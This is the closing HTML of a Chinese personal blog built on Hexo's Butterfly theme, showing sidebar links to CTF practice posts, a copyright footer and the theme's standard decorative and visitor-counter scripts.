onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DASCTF 2022"/></a><div class="content"><a class="title" href="/2022/03/23/DASCTF%202022/" title="DASCTF 2022">DASCTF 2022</a><time datetime="2022-03-23T06:15:21.000Z" title="发表于 2022-03-23 14:15:21">2022-03-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/23/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%986/" title="你爹刷题6"><img src="https://s2.loli.net/2022/03/23/ouOyf5ecU1hawIS.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="你爹刷题6"/></a><div class="content"><a class="title" href="/2022/03/23/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%986/" title="你爹刷题6">你爹刷题6</a><time datetime="2022-03-23T06:15:21.000Z" title="发表于 2022-03-23 14:15:21">2022-03-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/18/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%985/" title="你爹刷题5"><img src="https://s2.loli.net/2022/03/18/HlX1uC4D9eRkYPh.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="你爹刷题5"/></a><div class="content"><a class="title" href="/2022/03/18/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%985/" title="你爹刷题5">你爹刷题5</a><time datetime="2022-03-18T06:15:21.000Z" title="发表于 2022-03-18 14:15:21">2022-03-18</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://s2.loli.net/2022/02/08/LUMTIignN3mu2jb.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 吴豪滨</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
